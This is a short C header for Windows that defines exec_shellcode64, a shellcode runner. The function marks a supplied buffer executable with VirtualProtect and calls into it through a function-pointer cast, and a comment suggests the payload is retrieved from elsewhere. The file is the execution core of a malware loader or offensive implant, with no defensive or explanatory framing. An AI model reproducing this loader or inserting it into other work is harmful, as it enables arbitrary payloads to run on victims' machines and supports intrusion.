#pragma once

#include <stdio.h>
#include <windows.h>


void exec_shellcode64(unsigned char *shellcode) {
	#ifdef PRINT_DEBUG
		printf("exec_shellcode64\n ");
		int size=strlen(shellcode);
		printf("shellcode size: %d\n", size);
	#endif

    // Check for NULL pointer to handle cases where no shellcode data was retrieved
    if(shellcode != NULL) {
	    int len=strlen(shellcode);
	    DWORD l=0;
	    VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
	    (* (int(*)()) shellcode)();
    }
}
